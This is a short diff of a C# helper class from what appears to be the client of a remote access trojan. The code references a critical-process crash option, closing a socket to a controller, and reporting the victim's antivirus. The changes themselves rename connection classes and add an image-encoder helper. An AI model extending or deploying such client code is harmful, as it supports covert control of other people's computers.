@@ -1,5 +1,5 @@
 ﻿using Client.MessagePack;
-using Client.Sockets;
+using Client.Connection;
 using Microsoft.VisualBasic.Devices;
 using System;
 using System.Collections.Generic;
@@ -11,10 +11,11 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
+using System.Drawing.Imaging;
 
 namespace Client.Helper
 {
-   static class Methods
+    static class Methods
     {
         public static PerformanceCounter TheCPUCounter { get; } = new PerformanceCounter("Processor", "% Processor Time", "_Total");
         public static PerformanceCounter TheMemCounter { get; } = new PerformanceCounter("Memory", "% Committed Bytes In Use");
@@ -68,9 +69,9 @@ namespace Client.Helper
                 if (Convert.ToBoolean(Settings.BDOS) && IsAdmin())
                     ProcessCritical.Exit();
                 CloseMutex();
-                ClientSocket.Client?.Shutdown(SocketShutdown.Both);
+                ClientSocket.TcpClient?.Shutdown(SocketShutdown.Both);
                 ClientSocket.SslClient?.Close();
-                ClientSocket.Client?.Close();
+                ClientSocket.TcpClient?.Close();
             }
             catch { }
         }
@@ -106,5 +107,19 @@ namespace Client.Helper
             msgpack.ForcePathObject("Antivirus").AsString = Antivirus();
             return msgpack.Encode2Bytes();
         }
+
+        public static ImageCodecInfo GetEncoder(ImageFormat format)
+        {
+            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
+            foreach (ImageCodecInfo codec in codecs)
+            {
+                if (codec.FormatID == format.Guid)
+                {
+                    return codec;
+                }
+            }
+            return null;
+        }
+
     }
 }
